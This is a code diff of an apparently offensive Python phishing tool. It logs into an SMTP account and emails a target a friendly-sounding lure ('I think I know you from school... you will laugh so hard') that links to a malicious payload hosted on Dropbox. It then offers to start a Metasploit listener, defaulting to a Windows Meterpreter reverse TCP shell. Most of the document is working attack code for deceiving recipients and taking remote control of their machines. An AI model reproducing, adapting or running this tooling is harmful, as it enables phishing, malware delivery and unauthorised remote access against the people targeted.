@@ -25,6 +25,7 @@ from lazyme.string import color_print
 
 def banner ():
 
+	os.system("clear")
 	color_print(
 """
 
@@ -43,31 +44,26 @@ def banner ():
 def exploit ():
 
 	# Setup the config file
-	global name
+	global targetName
 	global email
 	global password
 	global target
 	global subject
 	global filename
 	global payload
-	global payload_new
-	global payload_pass
-	global payload_owner
 	global debuglevel
 
 	configParser = ConfigParser.RawConfigParser()	
 	configParser.read('config')
-	name = configParser.get('Config', 'name')
+	targetName = configParser.get('Config', 'targetName')
 	email = configParser.get('Config', 'email')
 	password = configParser.get('Config', 'password')
 	target = configParser.get('Config', 'target')
 	subject = configParser.get('Config', 'subject')
 	filename = configParser.get('Config', 'filename')
 	payload = configParser.get('Config', 'payload')
-	payload_new = configParser.get('Config', 'payload_new')
-	payload_pass = configParser.get('Config', 'payload_pass')
-	payload_owner = configParser.get('Config', 'payload_owner')
 	debuglevel = configParser.get('Config', 'debuglevel')
+
 	# Validate the input.
 	if email == 'None' or password == 'None' or target == 'None':
 		color_print('[!] Please setup your config file.', color='red')	
@@ -92,12 +88,11 @@ def exploit ():
 		# Connected to server.
 		color_print("\n[+] Connecting to smtp server..", color='blue')
 
-		global s
-		s = smtplib.SMTP()
-		s.connect(host=server, port=port)
-		s.ehlo()
-		s.starttls()
-		s.ehlo()
+		smtp = smtplib.SMTP()
+		smtp.connect(host=server, port=port)
+		smtp.ehlo()
+		smtp.starttls()
+		smtp.ehlo()
 		color_print("[+] Connected.", color='green')
 
 	except socket.gaierror:
@@ -107,10 +102,10 @@ def exploit ():
 
 	try:
 		# login and send the payload.
-		s.debuglevel = debuglevel
-		s.login(email, password)
+		smtp.debuglevel = debuglevel
+		smtp.login(email, password)
 		color_print("\n Logged in.", color='green')
-		sendpayload(s)
+		sendpayload(smtp)
 	except smtplib.SMTPAuthenticationError:
 		color_print("\nFaild to login try turning on lesssecureapps from 'https://myaccount.google.com/lesssecureapps'")
 		return
@@ -118,6 +113,12 @@ def exploit ():
 
 
 def sendpayload (server):
+
+
+	# Encrypt the payload
+	raw_input("[ Upload it to drop box and press enter ]")
+	link = raw_input("Paste the link to your file: ")		
+
 
 	msg = MIMEMultipart('alternative')	
 	msg['From'] = email
@@ -131,48 +132,51 @@ def sendpayload (server):
 Very funny
 </title>
 <p>
-Hi """ + name + """,
+Hi """ + targetName + """,
 <br></br>
-I think I know you from school, This is so funny check this out, you will laugh so hard. 
-Sorry the code is """ + payload_pass + """
+I think I know you from school, This is so funny check this out, you will laugh so hard.
 </p>
+<a href="""+link+""">""" + link + """</a>
+<br>
+</br>
 </html>
 """
 	html = MIMEText(text, 'html')
 	msg.attach(html)
 	
-	# Encrypt the payload
-	color_print("[*] Encrypting payload", color='yellow')
-	os.system("pdftk " + payload + " output " + payload_new + " owner_pw " + payload_owner + " user_pw "  + payload_pass) 
+	if os.path.isfile(payload):
 
-	# Attach the file.
-	fileMsg = MIMEBase('application','octet-stream')
- 	fileMsg.set_payload(file(payload_new).read())
-	encoders.encode_base64(fileMsg)
- 	fileMsg.add_header('Content-Disposition','attachment;filename= %s' % filename)
-  	msg.attach(fileMsg)
+		# Attach the file.
+		#fileMsg = MIMEBase('application','octet-stream')
+	 	#fileMsg.set_payload(file(payload_new).read())
+		#encoders.encode_base64(fileMsg)
+	 	#fileMsg.add_header('Content-Disposition','attachment;filename= %s' % filename)
+	  	#msg.attach(fileMsg)
 
-	# Send the payload
-	color_print("[*] Sending malicious payload..", color='yellow')
-	s.sendmail(email, target, msg.as_string())
-	color_print("[*] Sent.", color='green')
-	s.quit()
-	color_print("\n[*] Payload sent", color='green')
+		# Send the payload
+		#color_print("[*] Sending malicious payload..", color='yellow')
+		server.sendmail(email, target, msg.as_string())
+		color_print("[*] Sent.", color='green')
+		server.quit()
+		color_print("\n[*] Email sent", color='green')
 
-	# Do you want to listen for any connections.
-	listen = raw_input('Do you want to start up a listener: [Y/N]')
-	if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
-		color_print("[+] Starting a listener", color='blue')
-		listenForConnections()
+		# Do you want to listen for any connections.
+		listen = raw_input('Do you want to start up a listener: [Y/N]')
+		if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
+			color_print("[+] Starting a listener", color='blue')
+			listenForConnections()
+		else:
+			color_print("Thanks, Happy hacking", color='blue')
+			return	
 	else:
-		color_print("Thanks, Happy hacking", color='blue')
-		return	
-			
+		color_print("[!] Please put your payload in " + payload + " For it to work!!", color='red')	
 			
 def listenForConnections ():
 	lhost = raw_input('What is your LHOST (local ip address): ')
 	lport = raw_input('What is your LPORT (port): ')
 	payload = raw_input('What is your payload: (ex windows/meterpreter/reverse_tcp): ')
+	if payload == '':
+		payload = 'windows/meterpreter/reverse_tcp'
 
 	if os.path.isfile('resource.rc'):
 		os.system('rm resource.rc')
@@ -190,4 +194,3 @@ def listenForConnections ():
 #### Call the methods ####
 banner()
 exploit()		
-
